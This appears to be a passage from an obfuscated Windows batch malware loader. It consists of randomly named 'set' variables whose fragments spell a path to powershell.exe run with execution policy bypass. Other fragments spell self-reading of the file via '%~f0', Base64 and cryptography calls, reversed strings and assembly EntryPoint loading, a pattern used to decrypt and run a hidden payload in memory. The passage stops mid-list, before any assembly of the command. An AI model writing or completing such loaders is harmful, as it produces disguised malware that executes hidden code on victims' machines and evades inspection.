@echo off
set "JfrrGmwbRs=rS"
set "XkubtARtUO=he"
set "daCnOAwQSg=po"
set "syhhnoObOz=Po"
set "SqqAOAoyZi=ll"
set "bfhmYvqjrT=em"
set "gmhHQrygOp=st"
set "TlXSXASwUC=ow"
set "GOdTYeUVFU=nd"
set "emManahNBK=:\"
set "rkyTBeXXew=s\"
set "vujamcjvzD=ll"
set "zCkZItymIm=we"
set "gWQjhfNeLH=32"
set "qQLXXSjWIa=he"
set "sZuLvfdRck=\W"
set "vDdYQCqTWd=xe"
set "kHUEOfYEoV=y "
set "CwYMQUBbOp=Wi"
set "bEQWjIxfGc=co"
set "SMjwBphiGh=1."
set "UaOrbyfTMU=rs"
set "ZYAicjvXzL=do"
set "NNxShpiSbi=Sy"
set "BWJVqpPmiN= C"
set "CfsURpWqeE=0\"
set "fkRhJclklq=.e"
set "yodyeEJoDB= /"
set "tbRTVIkMzX=we"
set "EtvhXcKwQS=ws"
set "GRiPuIGlUL=in"
set "DxNEjmhQBa=\v"
set "NEwhCzXaDe=py"
set "OBzjnvBnNa=cd"
set "tpuqILDlLY= %~dp0"
set "tlCmjakqWd=New-"
set "lwhiKNVQHE=ress"
set "xWfABciZHx=acYW"
set "myxcEXRuDu= if "
set "WuoGcKhtdF=sion"
set "EAMJCOPaDJ=brea"
set "FMGiSzUoxD==');"
set "jQPzZPTudK=)) {"
set "BeLoECUfkv=tryP"
set "rbyRjrlxMe== [S"
set "HrfMJoGtkR=F'[-"
set "UktLooYvhk='txe"
set "tkraDJzNJb=comm"
set "GIVcCwjiOb=('%~f0'"
set "pglKMlPxmV=m.IO"
set "iWWZpuhUym=oL'["
set "cRfazjiYEy=File"
set "varzmJaNOk=]::("
set "SOFCpfmSAi=bypa"
set "IBHxldmGlm=HoWv"
set "bdsBhONhPK= = $"
set "dZojFklxUC=Disp"
set "xeZzpDMqVz=orF'"
set "CUfQEfVuYX=YJLs"
set "ctmBcHmuQJ=zO.I"
set "dBxklfSRVx=HLWe"
set "WLpypgfWFo=Mode"
set "nqcPWjvUUI=();$"
set "OFocDYnbiQ=ByzO"
set "ozXMmdrkDF=$nYD"
set "CqdnkdJDPx=pose"
set "lNRtagiMsw=..-1"
set "fBNTFnJjKr=  $H"
set "FnHrkQymlY=);$E"
set "xtluiHRNIF=gth)"
set "nSaiQRThCY=$yHL"
set "bDyLKDenvC=rofi"
set "fHiMnZyHBM=)))"
set "YeIxKlnIqJ=1..-"
set "xYfHkDnkuA=;$EP"
set "KzEQdianTb=esaB"
set "LlwRCroxOw=.Ass"
set "UDoodBEjVf=ateD"
set "PMDjJiLLqh=-joi"
set "GzdkVSqUiq=lBlo"
set "NGhVXZUMyy=tS46"
set "FuSlaOzhUF=[Sys"
set "MFiYUmLABn=oin "
set "HeJovxGhEB=ByzO"
set "vPLLVFuihl=ypto"
set "MtCvBPbuzE=nirt"
set "IEDSHpRrzZ=e = "
set "TVWHQEYtka=stem"
set "tmVbOCfXKI=iron"
set "cLiUVzWexS=S46e"
set "zgQnDAKbgl=)($y"
set "UiUrnaWGzt=$EYJ"
set "RWQbdNizUo=tem."
set "pRqnrARldw=).Sp"
set "wAMfkwUHru=raph"
set "hWGBnyJeRf=yHLW"
set "VObmceuNAa=.-16"
set "INDYQHBaAo=ert]"
set "gAHmpxiTwn=yHLW"
set "XpMwoYavdq=rt]:"
set "OdshntUBDG=New-"
set "TPmzPwgoIm=();$"
set "lQmyzvyjvH=se()"
set "RTzLslDdRS=ion."
set "MHjFYkHJle=[IO."
set "HxfiFPtTza=esMa"
set "QEmRSpQLFj= = $"
set "axWuYmJetK=OD.D"
set "KXildACHAA=ewLi"
set "eKQgzxTAkR=g = "
set "PqFVPDFtFR=k; }"
set "FrgzBTCtEy=($Ho"
set "gGlFYCVLiq=th('"
set "uwbavdTVKx=.Mod"
set "CTToJUWOqS=yste"
set "tEFAHrHCAS=Ls.T"
set "xWBFAwtKvv=flec"
set "EqCDXrDZnp=ach "
set "FZARAlsEFl=:: '"
set "hpeFIAVSFs=We ="
set "OAILFdqFzp=ose("
set "CYuybboHMF= [st"
